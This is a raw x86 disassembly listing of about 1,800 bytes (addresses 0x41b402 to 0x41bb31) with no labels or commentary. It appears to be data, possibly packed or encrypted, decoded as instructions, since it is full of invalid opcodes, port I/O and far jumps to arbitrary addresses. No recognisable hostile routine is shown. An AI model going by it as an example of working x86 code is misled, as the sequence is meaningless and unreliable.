  41b402:	setae  BYTE PTR [edx+edx*2+0x74734cb1]
  41b40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b40b:	gs mov ah,0xe4
  41b40e:	arpl   WORD PTR [edi-0x4513d2bd],sp
  41b414:	popf   
  41b415:	dec    edi
  41b416:	dec    ebx
  41b417:	lahf   
  41b418:	dec    esi
  41b419:	or     esi,DWORD PTR [edx+0x3f108c3b]
  41b41f:	xchg   ebx,eax
  41b420:	fnsave [edi]
  41b422:	dec    edi
  41b423:	sub    DWORD PTR [ebx+0x3e],ebp
  41b426:	and    eax,0x3c4b2874
  41b42b:	xchg   ebp,eax
  41b42c:	scas   eax,DWORD PTR es:[edi]
  41b42d:	mov    cs,WORD PTR [ecx-0x1dd514]
  41b433:	pop    ss
  41b434:	jmp    0x53ab:0x900de0d4
  41b43b:	test   DWORD PTR [ecx+eiz*1],esp
  41b43e:	pop    ss
  41b43f:	push   0xfffffffa
  41b441:	jge    0x41b459
  41b443:	mov    al,0x39
  41b445:	sti    
  41b446:	(bad)  
  41b447:	xchg   edi,eax
  41b448:	jl     0x41b467
  41b44a:	hlt    
  41b44b:	push   ss
  41b44c:	add    DWORD PTR [ecx],edx
  41b44e:	not    DWORD PTR [eax-0x6e]
  41b451:	mov    cl,BYTE PTR [ecx+0x32]
  41b454:	xor    DWORD PTR [edi*2-0x70a42b79],edi
  41b45b:	out    0xa,al
  41b45d:	push   edi
  41b45e:	data16 sub al,0x3d
  41b461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b462:	int    0x40
  41b464:	std    
  41b465:	retf   
  41b466:	stos   BYTE PTR es:[edi],al
  41b467:	pop    edi
  41b468:	dec    ecx
  41b469:	or     eax,0xc96e9a50
  41b46e:	pop    ecx
  41b46f:	js     0x41b410
  41b471:	mov    ebx,0xaebe72ca
  41b476:	pop    es
  41b477:	dec    ebx
  41b478:	jge    0x41b454
  41b47a:	cmp    eax,0x192a4495
  41b47f:	inc    esi
  41b480:	daa    
  41b481:	js     0x41b44f
  41b483:	std    
  41b484:	push   eax
  41b485:	push   ss
  41b486:	mov    edx,0xdde1f39
  41b48b:	mov    al,ds:0x21f2de27
  41b490:	add    BYTE PTR [ecx+0x42],ah
  41b493:	mov    al,BYTE PTR [edx]
  41b495:	push   edi
  41b496:	xchg   ebx,eax
  41b497:	sahf   
  41b498:	stos   BYTE PTR es:[edi],al
  41b499:	inc    esi
  41b49a:	pop    ebx
  41b49b:	aas    
  41b49c:	xchg   ecx,eax
  41b49d:	into   
  41b49e:	cwde   
  41b49f:	mov    edx,0x732ea13b
  41b4a4:	adc    al,BYTE PTR [esp+esi*2]
  41b4a7:	ins    DWORD PTR es:[edi],dx
  41b4a8:	ret    0x3187
  41b4ab:	and    DWORD PTR [edi+0x52],ebx
  41b4ae:	xor    ebx,DWORD PTR [esi-0x5b]
  41b4b1:	pop    esp
  41b4b2:	aam    0x33
  41b4b4:	push   ss
  41b4b5:	sbb    DWORD PTR [eax],0x60
  41b4b8:	ror    dh,1
  41b4ba:	mov    ecx,edi
  41b4bc:	lods   eax,DWORD PTR ds:[esi]
  41b4bd:	mov    eax,ds:0x5bfafa21
  41b4c2:	cs ss push ebp
  41b4c5:	in     al,dx
  41b4c6:	add    eax,0x42c98c5c
  41b4cb:	cld    
  41b4cc:	call   0xea01:0x8fc70c1a
  41b4d3:	in     al,0x88
  41b4d5:	xchg   BYTE PTR [esi+0x6a],ch
  41b4d8:	sbb    al,0xd3
  41b4da:	je     0x41b51d
  41b4dc:	inc    eax
  41b4dd:	mov    esp,DWORD PTR [edx-0x65]
  41b4e0:	jmp    0x41b47d
  41b4e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4e3:	cli    
  41b4e4:	enter  0xfdc0,0x91
  41b4e8:	test   DWORD PTR [edi-0x3610e106],esi
  41b4ee:	mov    ?,WORD PTR [edx-0x7d]
  41b4f1:	push   ss
  41b4f2:	xlat   BYTE PTR ds:[ebx]
  41b4f3:	sbb    DWORD PTR [ecx-0x7b198630],esi
  41b4f9:	inc    ebp
  41b4fa:	repnz add eax,0x5fda1121
  41b500:	loop   0x41b503
  41b502:	ret    0x5c7b
  41b505:	ret    
  41b506:	mov    al,ds:0xc2aa6903
  41b50b:	fwait
  41b50c:	adc    BYTE PTR [edx-0x38],ah
  41b50f:	enter  0xc2a4,0x20
  41b513:	mov    cl,0xca
  41b515:	inc    edi
  41b516:	pushf  
  41b517:	or     BYTE PTR [edx],0x1b
  41b51a:	retf   
  41b51b:	ds repz dec esi
  41b51e:	fisubr DWORD PTR [ebp+0x35]
  41b521:	cmp    eax,DWORD PTR [edx+0x11]
  41b524:	cmc    
  41b525:	push   ss
  41b526:	push   ebp
  41b527:	push   edx
  41b528:	adc    al,0x7
  41b52a:	xchg   ebp,eax
  41b52b:	xor    BYTE PTR ds:0xbd56b402,0x73
  41b532:	inc    esi
  41b533:	shl    BYTE PTR [eax-0x37],1
  41b536:	mov    ah,0x74
  41b538:	mov    BYTE PTR [ecx-0x43],dh
  41b53b:	sbb    ecx,DWORD PTR [edi+esi*8]
  41b53e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b540:	iret   
  41b541:	sub    eax,DWORD PTR [eax]
  41b543:	xor    eax,0x8fa484f2
  41b548:	cwde   
  41b549:	cli    
  41b54a:	shr    BYTE PTR [ecx],0x11
  41b54d:	jno    0x41b503
  41b54f:	dec    edx
  41b550:	outs   dx,BYTE PTR ds:[esi]
  41b551:	out    dx,eax
  41b552:	sbb    ebx,DWORD PTR ds:0xd869cfe6
  41b558:	dec    edx
  41b559:	popf   
  41b55a:	sbb    BYTE PTR [esi],bh
  41b55c:	lock jecxz 0x41b512
  41b55f:	inc    ebx
  41b560:	or     eax,0xc68c80c9
  41b565:	outs   dx,BYTE PTR ds:[esi]
  41b566:	push   ss
  41b567:	add    DWORD PTR [edi+0x6d],eax
  41b56a:	sub    DWORD PTR [eax+0x5b1b6d72],0x49
  41b571:	call   0xd249bb83
  41b576:	out    0xec,al
  41b578:	ins    DWORD PTR es:[edi],dx
  41b579:	mov    dl,0x2a
  41b57b:	daa    
  41b57c:	stos   DWORD PTR es:[edi],eax
  41b57d:	jo     0x41b524
  41b57f:	outs   dx,BYTE PTR ds:[esi]
  41b580:	or     ebx,DWORD PTR [eax-0x19]
  41b583:	shr    BYTE PTR [esi],0xb3
  41b586:	sub    eax,0xde0bbe79
  41b58b:	push   eax
  41b58c:	into   
  41b58d:	pop    es
  41b58e:	popf   
  41b58f:	mov    dl,BYTE PTR [bx+0x29]
  41b593:	mov    ch,0x4e
  41b595:	push   esi
  41b596:	not    BYTE PTR [eax-0x406248d9]
  41b59c:	out    0x76,al
  41b59e:	pop    es
  41b59f:	ins    BYTE PTR es:[edi],dx
  41b5a0:	lea    edi,[ebp-0x41]
  41b5a3:	pop    esi
  41b5a4:	add    DWORD PTR [ebx-0x51],edx
  41b5a7:	out    0x2e,eax
  41b5a9:	push   es
  41b5aa:	add    BYTE PTR [edx+0x77],0xd9
  41b5ae:	xor    BYTE PTR [ecx],dh
  41b5b0:	mov    edx,0xae4687c0
  41b5b5:	mov    eax,ds:0x6e218446
  41b5ba:	sahf   
  41b5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5bc:	cmp    eax,0x6b2863ed
  41b5c1:	push   ds
  41b5c2:	bound  ecx,QWORD PTR [edi+0x75e17030]
  41b5c8:	nop
  41b5c9:	iret   
  41b5ca:	lds    edi,FWORD PTR [ecx-0x3af6af05]
  41b5d0:	and    bl,BYTE PTR [esi+0x9]
  41b5d3:	cdq    
  41b5d4:	test   BYTE PTR [ecx-0x3df9d0d5],0xa1
  41b5db:	jp     0x41b638
  41b5dd:	fs icebp 
  41b5df:	jne    0x41b5c8
  41b5e1:	test   al,bl
  41b5e3:	fild   QWORD PTR [ecx-0x653c96f9]
  41b5e9:	mov    esi,0x13719fda
  41b5ee:	xchg   edi,eax
  41b5ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5f0:	mov    ds:0xccb74d6f,al
  41b5f5:	cs fmulp st(7),st
  41b5f8:	cmc    
  41b5f9:	push   ss
  41b5fa:	xchg   DWORD PTR ds:0x497836c7,ebp
  41b600:	cmp    DWORD PTR [ecx+0x7b1f706d],esi
  41b606:	ins    DWORD PTR es:[edi],dx
  41b607:	ret    
  41b608:	test   bl,bh
  41b60a:	in     al,0x71
  41b60c:	imul   ebx,DWORD PTR [ecx+ebp*2],0xfaf41cd2
  41b613:	sub    ebx,edx
  41b615:	das    
  41b616:	adc    DWORD PTR [eax+0x11bf82fb],esp
  41b61c:	or     esp,DWORD PTR [edx-0x3f]
  41b61f:	in     al,0x95
  41b621:	retf   
  41b622:	aad    0xe7
  41b624:	mov    ecx,0x840b03e6
  41b629:	xchg   esp,eax
  41b62a:	and    dl,BYTE PTR [edx+0x22]
  41b62d:	xchg   ecx,eax
  41b62e:	dec    edx
  41b62f:	popf   
  41b630:	ins    BYTE PTR es:[edi],dx
  41b631:	dec    ebx
  41b632:	ss call 0x81ad:0xa069f1f4
  41b63a:	scas   al,BYTE PTR es:[edi]
  41b63b:	outs   dx,BYTE PTR ds:[esi]
  41b63c:	gs cmp al,0x91
  41b63f:	xor    DWORD PTR [edx+0x68],esp
  41b642:	(bad)  [esi-0x10]
  41b645:	mov    esp,0x4a460c24
  41b64a:	std    
  41b64b:	xor    bh,BYTE PTR [ebx]
  41b64d:	cli    
  41b64e:	and    al,0x56
  41b650:	push   cs
  41b651:	adc    esi,ebp
  41b653:	push   edx
  41b654:	cmc    
  41b655:	xor    ah,dl
  41b657:	mov    DWORD PTR [esi-0x3c],ebx
  41b65a:	add    edx,DWORD PTR [ebx-0x62d9ec69]
  41b660:	inc    esp
  41b661:	dec    ecx
  41b662:	imul   eax,ebp,0x157d6b7d
  41b668:	jl     0x41b5f1
  41b66a:	repnz mov eax,0xb736e8a8
  41b670:	je     0x41b62c
  41b672:	jp     0x41b62a
  41b674:	mov    ah,0x5e
  41b676:	nop
  41b677:	add    al,0x4b
  41b679:	outs   dx,DWORD PTR ds:[esi]
  41b67a:	mul    dl
  41b67c:	pop    ds
  41b67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b67e:	int3   
  41b67f:	fmul   DWORD PTR [edi-0x15]
  41b682:	or     DWORD PTR [edi+eax*1],eax
  41b685:	mov    al,ds:0xf0ebe0f2
  41b68a:	jl     0x41b61b
  41b68c:	add    eax,0x6db181e7
  41b691:	xchg   esp,eax
  41b692:	retf   
  41b693:	cmp    BYTE PTR [eax-0x3e],bh
  41b696:	loope  0x41b62c
  41b698:	retf   0x8bf2
  41b69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b69c:	inc    ebx
  41b69d:	pop    ebx
  41b69e:	mov    eax,0xcaf10c23
  41b6a3:	mov    cl,0xee
  41b6a5:	push   ebp
  41b6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a7:	add    DWORD PTR [eax+0x24d287e8],ebp
  41b6ad:	or     eax,0x7b1579b
  41b6b2:	mov    ebp,db5
  41b6b5:	in     al,0xcb
  41b6b7:	push   ebx
  41b6b8:	loope  0x41b72f
  41b6ba:	dec    ebx
  41b6bb:	call   DWORD PTR [eax]
  41b6bd:	imul   ebx,DWORD PTR [edx+0x3b6751c1],0xd7fc5220
  41b6c7:	cmp    ebx,edi
  41b6c9:	cdq    
  41b6ca:	(bad)  
  41b6cb:	pop    ecx
  41b6cc:	ins    BYTE PTR es:[edi],dx
  41b6cd:	push   ecx
  41b6ce:	mov    bl,0xc2
  41b6d0:	pushf  
  41b6d1:	add    eax,0xf448a9ae
  41b6d6:	mov    ds:0x63d682b0,al
  41b6db:	xor    BYTE PTR [esi+0x2602343],cl
  41b6e1:	lahf   
  41b6e2:	out    0xc2,al
  41b6e4:	es iret 
  41b6e6:	xor    DWORD PTR [ebx+0x73],ebx
  41b6e9:	ret    0xff02
  41b6ec:	cld    
  41b6ed:	lods   eax,DWORD PTR ds:[esi]
  41b6ee:	imul   esp,DWORD PTR [edx+esi*8+0xa],0xc1f3bacd
  41b6f6:	cdq    
  41b6f7:	nop
  41b6f8:	scas   eax,DWORD PTR es:[edi]
  41b6f9:	mov    ecx,0x5c940d3d
  41b6fe:	adc    DWORD PTR [eax],esp
  41b700:	cdq    
  41b701:	mov    bh,0x53
  41b703:	cld    
  41b704:	fsubr  QWORD PTR [eax-0x77]
  41b707:	xchg   ebx,edx
  41b709:	push   esi
  41b70a:	pop    edx
  41b70b:	stc    
  41b70c:	mov    ch,0x83
  41b70e:	dec    esi
  41b70f:	mov    cl,0xf2
  41b711:	(bad)  
  41b712:	retf   0x4dc8
  41b715:	jge    0x41b743
  41b717:	aad    0x5c
  41b719:	and    eax,0xb5a52e1c
  41b71e:	push   ss
  41b71f:	and    ebp,DWORD PTR [ebp+0x279850ff]
  41b725:	xlat   BYTE PTR ds:[ebx]
  41b726:	xchg   ebp,eax
  41b727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b728:	test   BYTE PTR [esi-0x1c],dh
  41b72b:	es or  eax,0xa0093811
  41b731:	mov    ebx,0x6b20622a
  41b736:	inc    ebx
  41b737:	ror    cl,0x14
  41b73a:	fnstsw WORD PTR [ecx]
  41b73c:	enter  0xe1c9,0xb6
  41b740:	test   eax,0xe7075c57
  41b745:	ins    DWORD PTR es:[edi],dx
  41b746:	xchg   esp,ecx
  41b748:	ins    BYTE PTR es:[edi],dx
  41b749:	mov    ebx,0x49fb0619
  41b74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b74f:	push   edx
  41b750:	push   0x49b0e73b
  41b755:	aaa    
  41b756:	jp     0x41b6db
  41b758:	adc    DWORD PTR [ebp+0x4be892fb],ebp
  41b75e:	imul   ebx,DWORD PTR [ebx],0xffffffb7
  41b761:	lods   al,BYTE PTR ds:[esi]
  41b762:	cmp    eax,0xfe389ce6
  41b767:	cli    
  41b768:	add    DWORD PTR [eax-0x48],eax
  41b76b:	cmp    bh,dl
  41b76d:	mov    cl,0xa2
  41b76f:	sbb    ch,bl
  41b771:	frstor [edx-0x42]
  41b774:	loope  0x41b708
  41b776:	push   ebp
  41b777:	pop    ebp
  41b778:	pop    ebp
  41b779:	fwait
  41b77a:	xor    ch,dh
  41b77c:	xchg   ebp,edx
  41b77e:	push   ss
  41b77f:	and    dl,cl
  41b781:	mov    ebx,0x4dca9baa
  41b786:	xchg   esp,eax
  41b787:	fsubr  QWORD PTR [eax-0x1d]
  41b78a:	and    DWORD PTR [esi-0x741ec707],ecx
  41b790:	xchg   esp,eax
  41b791:	jmp    FWORD PTR [eax]
  41b793:	nop
  41b794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b795:	test   al,0x97
  41b797:	mov    dl,BYTE PTR [edx]
  41b799:	outs   dx,DWORD PTR ds:[esi]
  41b79a:	arpl   WORD PTR [edx-0x2],ax
  41b79d:	and    esi,esp
  41b79f:	fcomp  QWORD PTR [edi+0x589118c6]
  41b7a5:	int    0x16
  41b7a7:	add    al,0x77
  41b7a9:	pop    eax
  41b7aa:	mov    eax,DWORD PTR [edi]
  41b7ac:	std    
  41b7ad:	xor    eax,0xe016184f
  41b7b2:	xchg   esi,eax
  41b7b3:	(bad)
  41b7b7:	add    DWORD PTR [edi+0x1068513d],0x4bf8f311
  41b7c1:	adc    BYTE PTR [edx-0x167418e3],ah
  41b7c7:	ja     0x41b815
  41b7c9:	(bad)  
  41b7ca:	sbb    al,0xbb
  41b7cc:	fwait
  41b7cd:	dec    edx
  41b7ce:	push   ebx
  41b7cf:	and    al,0xf5
  41b7d1:	and    ecx,DWORD PTR [esp+edx*2-0x3e4577c5]
  41b7d8:	dec    ebp
  41b7d9:	imul   edi,DWORD PTR [edx],0x76
  41b7dc:	pop    edi
  41b7dd:	int3   
  41b7de:	enter  0xa92b,0x56
  41b7e2:	rcl    BYTE PTR [ecx],1
  41b7e4:	sub    ch,BYTE PTR [ecx+ebx*2-0x526ad5de]
  41b7eb:	idiv   al
  41b7ed:	nop
  41b7ee:	pusha  
  41b7ef:	pop    es
  41b7f0:	jae    0x41b7e1
  41b7f2:	outs   dx,DWORD PTR ds:[esi]
  41b7f3:	arpl   bp,cx
  41b7f5:	jae    0x41b7ca
  41b7f7:	and    al,0x7b
  41b7f9:	mov    ecx,0xb7140096
  41b7fe:	lods   al,BYTE PTR ds:[esi]
  41b7ff:	lods   al,BYTE PTR ds:[esi]
  41b800:	ins    BYTE PTR es:[edi],dx
  41b801:	ins    DWORD PTR es:[edi],dx
  41b802:	xor    esi,esp
  41b804:	iret   
  41b805:	int    0x96
  41b807:	mov    ch,0xca
  41b809:	pushf  
  41b80a:	sar    DWORD PTR [esi+0x1],cl
  41b80d:	mov    bl,0x80
  41b80f:	(bad)  
  41b810:	mov    bh,0x3e
  41b812:	mov    DWORD PTR [edx-0x5169e817],ecx
  41b818:	xor    DWORD PTR [eax],eax
  41b81a:	inc    edx
  41b81b:	xor    DWORD PTR [ecx],eax
  41b81d:	jnp    0x41b7de
  41b81f:	pop    ecx
  41b820:	dec    ecx
  41b821:	adc    ebx,DWORD PTR [edi]
  41b823:	aaa    
  41b824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b825:	fist   WORD PTR [eax]
  41b827:	dec    edx
  41b828:	jno    0x41b883
  41b82a:	mov    ebp,0x4d3e7e98
  41b82f:	cmc    
  41b830:	add    DWORD PTR [ebp-0x7955a8f5],ebx
  41b836:	and    ebp,ebp
  41b838:	test   bh,bl
  41b83a:	adc    DWORD PTR [edx],esi
  41b83c:	les    esi,FWORD PTR [edx+0x63c77558]
  41b842:	jbe    0x41b878
  41b844:	aam    0xc1
  41b846:	sub    eax,0xdf55f863
  41b84b:	mov    dh,0x40
  41b84d:	jmp    0x82e:0x696a3834
  41b854:	test   DWORD PTR [eax],ebp
  41b856:	sti    
  41b857:	in     eax,dx
  41b858:	sub    eax,DWORD PTR [ecx]
  41b85a:	jns    0x41b7dd
  41b85c:	xor    BYTE PTR [ebp-0x60e28504],0x2a
  41b863:	outs   dx,DWORD PTR ds:[esi]
  41b864:	aaa    
  41b865:	lahf   
  41b866:	and    al,BYTE PTR [ebx+0x282e5566]
  41b86c:	mov    ebx,0x5ec7bd81
  41b871:	test   al,0xc
  41b873:	xor    eax,0x3d7fbdf4
  41b878:	cwde   
  41b879:	jmp    0x65e3:0x24b10c26
  41b880:	mov    ch,0xc3
  41b882:	adc    DWORD PTR [edi],ebp
  41b884:	add    ch,BYTE PTR [edi-0x65bf6833]
  41b88a:	pusha  
  41b88b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b88c:	jmp    0x3f50:0x627a00b1
  41b893:	cmc    
  41b894:	ds cs sub edx,0x3ece5c55
  41b89c:	ss push ss
  41b89e:	fwait
  41b89f:	jecxz  0x41b8ff
  41b8a1:	sbb    DWORD PTR [edx+eax*2],edi
  41b8a4:	ret    0x9071
  41b8a7:	fld    DWORD PTR [esi+0x65a38b83]
  41b8ad:	jb     0x41b898
  41b8af:	mov    ch,0x94
  41b8b1:	push   esp
  41b8b2:	and    edi,DWORD PTR [esi-0x13a5a1fb]
  41b8b8:	mov    al,0x8d
  41b8ba:	add    al,0x18
  41b8bc:	jbe    0x41b845
  41b8be:	scas   eax,DWORD PTR es:[edi]
  41b8bf:	pop    eax
  41b8c0:	mov    cl,dl
  41b8c2:	sbb    esi,edi
  41b8c4:	imul   esp,esi,0x9f452ae1
  41b8ca:	cmp    al,BYTE PTR [edx-0x6]
  41b8cd:	(bad)  
  41b8ce:	je     0x41b929
  41b8d0:	cmp    DWORD PTR [ecx+ebp*8],ebp
  41b8d3:	or     bh,0x60
  41b8d6:	cmc    
  41b8d7:	push   ss
  41b8d8:	fld    TBYTE PTR [esi]
  41b8da:	push   ecx
  41b8db:	inc    ebp
  41b8dc:	xchg   BYTE PTR [ebp+0x4e],ch
  41b8df:	jbe    0x41b878
  41b8e1:	aas    
  41b8e2:	pop    esi
  41b8e3:	mov    cl,0xf4
  41b8e5:	or     DWORD PTR [edi+0x1069596e],0xc77dad7f
  41b8ef:	sbb    DWORD PTR [eax-0x7a],ecx
  41b8f2:	iret   
  41b8f3:	or     bh,BYTE PTR [ebp-0x71]
  41b8f6:	and    DWORD PTR [edi-0xf],ebp
  41b8f9:	out    0x46,al
  41b8fb:	mov    ss,esi
  41b8fd:	sub    eax,0x7748d9c
  41b902:	jmp    0x41b8bc
  41b904:	pusha  
  41b905:	cli    
  41b906:	inc    eax
  41b907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b908:	leave  
  41b909:	out    dx,eax
  41b90a:	push   edx
  41b90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b90c:	std    
  41b90d:	and    esi,DWORD PTR [ebp+0x5]
  41b910:	es ret 0xdfaf
  41b914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b915:	xchg   edx,eax
  41b916:	xchg   DWORD PTR [ebp-0xd],edx
  41b919:	das    
  41b91a:	jbe    0x41b93f
  41b91c:	pushf  
  41b91d:	sbb    al,0x52
  41b91f:	fld    TBYTE PTR [eax-0x51]
  41b922:	cdq    
  41b923:	mov    cl,0x89
  41b925:	adc    DWORD PTR [edi],edi
  41b927:	lods   al,BYTE PTR ds:[esi]
  41b928:	icebp  
  41b929:	add    bh,BYTE PTR ds:0x13a3769b
  41b92f:	inc    esp
  41b930:	mov    ebx,0x3749ffd3
  41b935:	mov    ds:0x2c476d3b,eax
  41b93a:	push   es
  41b93b:	dec    DWORD PTR [ecx+0x6eeb4812]
  41b941:	(bad)  
  41b942:	push   edx
  41b943:	jns    0x41b8f6
  41b945:	out    dx,eax
  41b946:	les    ebx,FWORD PTR [ecx-0x6494a6c]
  41b94c:	and    edi,DWORD PTR [edx+0x11c949d8]
  41b952:	and    al,0x14
  41b954:	popa   
  41b955:	mov    al,ds:0x52ed7128
  41b95a:	mov    cl,0xa4
  41b95c:	xchg   ebp,eax
  41b95d:	mov    ebx,0xfc2779b8
  41b962:	xchg   ecx,eax
  41b963:	mov    ds:0xeb91808c,eax
  41b968:	ror    DWORD PTR [eax],cl
  41b96a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b96b:	aas    
  41b96c:	jae    0x41b9e2
  41b96e:	fsubr  DWORD PTR [edi+0x4e]
  41b971:	lods   eax,DWORD PTR ds:[esi]
  41b972:	cli    
  41b973:	arpl   WORD PTR [ecx-0x7ba1d1b0],bx
  41b979:	test   al,0xc0
  41b97b:	push   0xe3c4d1b
  41b980:	stc    
  41b981:	pop    edx
  41b982:	mov    bh,0x11
  41b984:	xor    dh,dl
  41b986:	sub    eax,0x875302a2
  41b98b:	jmp    0xffca:0x7e82dea9
  41b992:	jmp    0xfe0b:0xeacc2da0
  41b999:	aam    0x68
  41b99b:	aas    
  41b99c:	pop    edx
  41b99d:	lods   al,BYTE PTR ds:[esi]
  41b99e:	dec    esp
  41b99f:	mov    ch,0x23
  41b9a1:	cmp    esp,0xaf0aec57
  41b9a7:	outs   dx,DWORD PTR ds:[esi]
  41b9a8:	cmc    
  41b9a9:	out    dx,al
  41b9aa:	mov    cl,0x7d
  41b9ac:	pop    es
  41b9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9ae:	lock out 0x35,al
  41b9b1:	stos   BYTE PTR es:[edi],al
  41b9b2:	ret    0xa8ae
  41b9b5:	dec    edi
  41b9b6:	(bad)  
  41b9b7:	je     0x41ba13
  41b9b9:	fwait
  41b9ba:	sub    BYTE PTR [edx],dh
  41b9bc:	jae    0x41b97d
  41b9be:	(bad)  
  41b9c0:	jecxz  0x41b946
  41b9c2:	push   ds
  41b9c3:	test   al,0x7
  41b9c5:	xchg   edx,eax
  41b9c6:	mov    ?,WORD PTR [ecx]
  41b9c8:	dec    ebx
  41b9c9:	cmp    edx,esi
  41b9cb:	int3   
  41b9cc:	out    dx,al
  41b9cd:	fsubr  QWORD PTR [ecx+edx*4-0x286caa1d]
  41b9d4:	sub    bh,BYTE PTR [edx+0x28]
  41b9d7:	test   eax,0x80a750fb
  41b9dc:	clc    
  41b9dd:	rol    BYTE PTR [ecx],cl
  41b9df:	push   es
  41b9e0:	js     0x41ba59
  41b9e2:	adc    esi,DWORD PTR [esi+0x28]
  41b9e5:	cli    
  41b9e6:	sub    al,0x30
  41b9e8:	xchg   esi,eax
  41b9e9:	mov    BYTE PTR [edx+ecx*8-0x76],bl
  41b9ed:	(bad)  
  41b9ee:	mov    ebx,0xbe3d2fa5
  41b9f3:	or     al,0x6a
  41b9f5:	or     DWORD PTR [ebp+0x50],edx
  41b9f8:	es jno 0x41ba01
  41b9fb:	sti    
  41b9fc:	sbb    edi,esp
  41b9fe:	outs   dx,DWORD PTR ds:[esi]
  41b9ff:	push   esp
  41ba00:	cli    
  41ba01:	test   al,0x5
  41ba03:	xchg   esp,eax
  41ba04:	cs lahf 
  41ba06:	xchg   ecx,eax
  41ba07:	jns    0x41ba55
  41ba09:	mov    WORD PTR [edx+0x64a332a8],?
  41ba0f:	xlat   BYTE PTR ds:[ebx]
  41ba10:	jle    0x41ba07
  41ba12:	pop    ds
  41ba13:	(bad)  
  41ba14:	clc    
  41ba15:	sub    eax,0xb263f471
  41ba1a:	inc    esi
  41ba1b:	fisttp WORD PTR [edi+0x37]
  41ba1e:	mov    ?,WORD PTR ds:0x5efe5591
  41ba24:	ins    BYTE PTR es:[edi],dx
  41ba25:	leave  
  41ba26:	xchg   DWORD PTR [ecx+0x45683980],eax
  41ba2c:	push   es
  41ba2d:	xchg   ebp,eax
  41ba2e:	ret    
  41ba2f:	and    DWORD PTR [ebx+0x1a],edi
  41ba32:	ret    
  41ba33:	cli    
  41ba34:	in     al,dx
  41ba35:	mov    esp,0x23a1501b
  41ba3a:	jmp    0xe4a0692d
  41ba3f:	mov    BYTE PTR [ecx-0x2a384070],al
  41ba45:	imul   edi,DWORD PTR [edx-0x1a],0x57
  41ba49:	inc    bl
  41ba4b:	in     al,0x2c
  41ba4d:	fld    st(3)
  41ba4f:	cs stos DWORD PTR es:[edi],eax
  41ba51:	cld    
  41ba52:	sbb    esp,0x6c
  41ba55:	test   al,0x70
  41ba57:	retf   
  41ba58:	xlat   BYTE PTR ds:[ebx]
  41ba59:	js     0x41ba10
  41ba5b:	jl     0x41ba9e
  41ba5d:	int3   
  41ba5e:	jle    0x41ba5c
  41ba60:	loope  0x41b9e2
  41ba62:	push   ss
  41ba63:	ins    BYTE PTR es:[edi],dx
  41ba64:	nop    ecx
  41ba67:	xchg   ebx,eax
  41ba68:	and    DWORD PTR ds:[ecx],ebp
  41ba6b:	fdiv   DWORD PTR [esi-0x74]
  41ba6e:	jbe    0x41ba3b
  41ba70:	sar    DWORD PTR [ecx+0x7f4a2ee2],cl
  41ba76:	xor    eax,0xa8b28b29
  41ba7b:	cmp    eax,0xa2028dc3
  41ba80:	jg     0x41baf8
  41ba82:	(bad)  [esi+0x48]
  41ba85:	inc    edi
  41ba86:	mov    bh,0x91
  41ba88:	push   esp
  41ba89:	jbe    0x41ba45
  41ba8b:	xchg   edx,eax
  41ba8c:	mov    al,ds:0xb2dd533b
  41ba91:	push   eax
  41ba92:	in     eax,dx
  41ba93:	mov    dh,cl
  41ba95:	pop    edi
  41ba96:	fist   DWORD PTR [ecx]
  41ba98:	test   BYTE PTR [edx+edi*2-0x278cf3f1],dl
  41ba9f:	sub    DWORD PTR [edi-0x73],ecx
  41baa2:	rol    DWORD PTR [ebx-0x3a35eeb0],1
  41baa8:	sbb    BYTE PTR [edx+0x45a44239],ah
  41baae:	and    BYTE PTR [ebx+0x57],ch
  41bab1:	sar    BYTE PTR [edx],1
  41bab3:	pop    ecx
  41bab4:	jbe    0x41ba80
  41bab6:	stos   DWORD PTR es:[edi],eax
  41bab7:	call   0x3caa:0xfbf4f594
  41babe:	lahf   
  41babf:	jge    0x41baa3
  41bac1:	jl     0x41bac2
  41bac3:	loopne 0x41ba95
  41bac5:	push   ebp
  41bac6:	cld    
  41bac7:	mov    dl,0xe2
  41bac9:	mov    al,ds:0xc5c4362e
  41bace:	popa   
  41bacf:	fsub   QWORD PTR [ebx-0x38]
  41bad2:	mov    ds:0x13ed418e,eax
  41bad7:	mov    al,0x93
  41bad9:	pushf  
  41bada:	mov    edi,0xb88afec
  41badf:	icebp  
  41bae0:	out    dx,al
  41bae1:	adc    dh,BYTE PTR [edi]
  41bae3:	sub    eax,0x16
  41bae6:	cmp    eax,0xe06bbce3
  41baeb:	ret    0xc1fc
  41baee:	shl    bh,0x67
  41baf1:	xor    eax,0xaf7c525a
  41baf6:	pop    ds
  41baf7:	inc    edi
  41baf8:	and    BYTE PTR [edi],bh
  41bafa:	mov    ds,WORD PTR [ecx+0x6361d2cb]
  41bb00:	push   eax
  41bb01:	test   BYTE PTR [esi+0x27],al
  41bb04:	mov    edx,0x3d69ebd1
  41bb09:	adc    BYTE PTR [ebx+ebp*4-0x11684c10],bl
  41bb10:	popf   
  41bb11:	imul   edx,esp,0xffffffef
  41bb14:	sbb    dl,dl
  41bb16:	add    BYTE PTR [ecx-0x78],dh
  41bb19:	(bad)  
  41bb1a:	lds    ecx,FWORD PTR [edi+0x600da959]
  41bb20:	ds dec ebx
  41bb22:	mov    eax,0x5afcb2f6
  41bb27:	(bad)  
  41bb28:	stc    
  41bb29:	mov    bh,BYTE PTR [eax-0x295fa7aa]
  41bb2f:	push   esp
  41bb30:	daa    
  41bb31:	in     al,0xfa
